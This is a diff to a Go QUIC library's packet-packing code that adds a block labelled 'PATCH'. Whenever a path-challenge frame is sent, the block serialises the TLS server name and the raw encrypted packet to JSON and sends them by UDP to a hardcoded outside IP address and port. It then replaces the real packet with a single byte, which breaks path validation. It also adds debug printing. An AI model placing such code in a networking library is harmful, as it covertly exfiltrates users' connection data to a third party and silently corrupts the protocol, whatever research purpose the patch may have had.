@@ -1,10 +1,16 @@
 package quic
 
 import (
+	"bytes"
 	crand "crypto/rand"
+	"crypto/tls"
 	"encoding/binary"
+	"encoding/json"
 	"errors"
 	"fmt"
+	"log"
+	"net"
+	"reflect"
 
 	"golang.org/x/exp/rand"
 
@@ -102,6 +108,7 @@ type sealingManager interface {
 	GetHandshakeSealer() (handshake.LongHeaderSealer, error)
 	Get0RTTSealer() (handshake.LongHeaderSealer, error)
 	Get1RTTSealer() (handshake.ShortHeaderSealer, error)
+	GetTlsConf() (*tls.Config, error)
 }
 
 type frameSource interface {
@@ -841,6 +848,70 @@ func (p *packetPacker) appendShortHeaderPacket(
 		}
 	}
 	raw = p.encryptPacket(raw, sealer, pn, payloadOffset, protocol.ByteCount(pnLen))
+	/* PATCH */
+	num := 0
+	if pl.frames != nil {
+		for _, f := range pl.frames {
+			fmt.Println("Type of frame:", num, reflect.TypeOf(f.Frame))
+			num += 1
+		}
+
+		if _, ok := pl.frames[0].Frame.(*wire.PathChallengeFrame); ok {
+			//return shortHeaderPacket{}, fmt.Errorf("packetPacker BUG????:")
+
+			cryptoSetup := p.cryptoSetup.(handshake.CryptoSetup)
+			tlsConf, _ := cryptoSetup.GetTlsConf()
+			connAddr := tlsConf.ServerName
+			type Message struct {
+				ConnAddr  string
+				PcMessage []byte
+			}
+			message := Message{
+				ConnAddr:  connAddr,
+				PcMessage: raw,
+			}
+
+			// 序列化消息
+			jsonData, err := json.Marshal(message)
+			if err != nil {
+				log.Println("序列化消息时发生错误:", err)
+				return shortHeaderPacket{}, err
+			}
+
+			// 创建 UDP 连接
+			serverIP := "202.112.47.62"
+			serverPort := "14443"
+			conn, err := net.Dial("udp", serverIP+":"+serverPort)
+			if err != nil {
+				log.Println("无法连接到服务器:", err)
+				return shortHeaderPacket{}, err
+			}
+			defer conn.Close()
+
+			_, err = conn.Write(jsonData)
+			if err != nil {
+				log.Println("发送消息时发生错误:", err)
+				return shortHeaderPacket{}, err
+			}
+			log.Println("发送消息:", jsonData)
+			raw = bytes.Repeat([]byte("A"), 1)
+
+			//return shortHeaderPacket{}, errors.New("prevent PC frame")
+
+			//fmt.Printf("ip & port: %s\n", cryptoSetup.NextEvent().Data)
+			//fmt.Printf("this one???:%02x\n", raw)
+			// fmt.Printf("ip & port: %s\n", cryptoSetup)
+			// switch p.cryptoSetup.(type) {
+			// case handshake.CryptoSetup:
+
+			// 	fmt.Println("?????:", (connAddr))
+			// }
+			// fmt.Println("Type of frame:", reflect.TypeOf(pl.frames[0].Frame))
+			//fmt.Println("Type of frame:", reflect.TypeOf(p.cryptoSetup))
+		}
+
+	}
+
 	buffer.Data = buffer.Data[:len(buffer.Data)+len(raw)]
 
 	if newPN := p.pnManager.PopPacketNumber(protocol.Encryption1RTT); newPN != pn {
